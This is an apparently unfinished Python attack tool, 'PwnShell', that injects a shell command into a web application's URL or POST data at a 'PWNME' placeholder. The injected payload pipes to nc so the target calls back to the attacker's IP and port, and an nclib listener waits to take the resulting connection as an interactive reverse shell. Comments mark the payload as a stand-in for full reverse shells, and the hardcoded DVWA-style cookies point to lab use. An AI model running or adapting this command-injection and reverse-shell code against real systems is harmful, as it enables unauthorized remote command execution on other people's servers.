#!/usr/bin/env python3
#coding=utf-8
import netifaces
import base64
import requests
import os
import argparse
import nclib
from threading import Thread
import ipaddress
import urllib3
import json


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = ''' 

     __    ____                _____ __         ____    __
   _/ /   / __ \_      ______ / ___// /_  ___  / / /  _/ /
  / __/  / /_/ / | /| / / __ \\__ \/ __ \/ _ \/ / /  / __/
 (_  )  / ____/| |/ |/ / / / /__/ / / / /  __/ / /  (_  ) 
/  _/  /_/     |__/|__/_/ /_/____/_/ /_/\\___/_/_/  /  _/  
/_/                                                /_/    

'''
print(banner)

def main():
	global args , default_ip , nc , port , ip , domain , method ,data , authentication 
	ip_address = netifaces.ifaddresses('tun0')[2][0]['addr']
	################################# Arguments Crreation ###########################################
	parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
	parser.add_argument('-H','--host',help='LOCAL IP ADDRESS',default=ip_address)
	parser.add_argument('-p','--port',help='LOCAL PORT NUMBER',type=int,default=9001)
	parser.add_argument("-t","--type",help='Payload Type [windows/linux]',type=str,default='linux')
	parser.add_argument("-u","--url",help='Target url [http://localhost:8888/h.php?meow=PWNME]')
	parser.add_argument("-c","--cookie",help='Enter Cookie')
	parser.add_argument("-k","--header",help='Provide header')
	parser.add_argument("-m","--method",help='Request Method',default='post')
	parser.add_argument("-d","--data",help='Post data')
	parser.add_argument("-a","--auth",help='Authentication', nargs=2)
	#parser.add_argument("-U","--user",help='Username')
	#parser.add_argument("-P","--passwd",help='Password')
	args = parser.parse_args()
	##################################################################################################
	########################## Defining variables ##########################
	ip=ip_address
	ip=args.host
	port=args.port
	domain=args.url
	method=args.method
	data=args.data
	authentication=args.auth
	#user=args.user
	#passwd=args.passwd
	########################################################################
	###################### Specifying OS ###################################
	if args.type == "linux" or args.type == "l":
		shell_linux()
	elif args.type == "windows" or args.type == "w":
		shell_windows()
	else:
		print("[!]Invalid Value -> "+ args.type)
	######################################################################

def shell_linux():
	print("listening on port: "+ f"{port}" + "\n" + "Default ip for payloads: "+ f"{ip}")
	print ("---> Waiting For a connection ")
	print(authentication[0])
	login()
	#thread()
	#is_valid()
	#send_payload()
	#listener()


def is_valid():
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False
        # ADD a better except to break the program

def listener():
	nc = nclib.Netcat(listen=('', port))
	nc.interact()
	nc.close()

def thread():
	t1=Thread(target=listener)
	t2=Thread(target=send_payload)
	t1.start()
	t2.start()
	t1.join()
	t2.join()

def send_payload():
	if method == 'post':
		req_post()
	elif method == 'get':
		print('get method')
		req_get()
	else:
		return False

def req_post():
	payload=f'''echo "hello" | nc {ip} {port}'''
	url = domain.replace('PWNME',payload) #payload will be the revshells
	proxies={'http':'http://127.0.0.1:8080'}
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'} #Don't Change*
	cookies={'PHPSESSID':'57gcuqnl9bjalet0s7af55lir0', 'security':'low'}
	data_parsed=data.replace("PWNME",payload) #Don't change
	print(data_parsed)
	r=requests.post(url,headers=headers,data=data_parsed,cookies=cookies,proxies=proxies)

def req_get():
	url = domain.replace('PWNME','127.0.0.1') #payload will be the revshells
	cookies=''
	r=requests.get(url)

def login():
	pass



def exit():
	pass

if __name__ == '__main__':
		main()


#TODO
#add payloads to a list or a dict for iteration
#see how to get the headers automatically and send them instead of writing them manually
#Add login form with a session
#Add customization for cookies & Headers
#Add the payload generator
#Add an exit message to break instead of errors
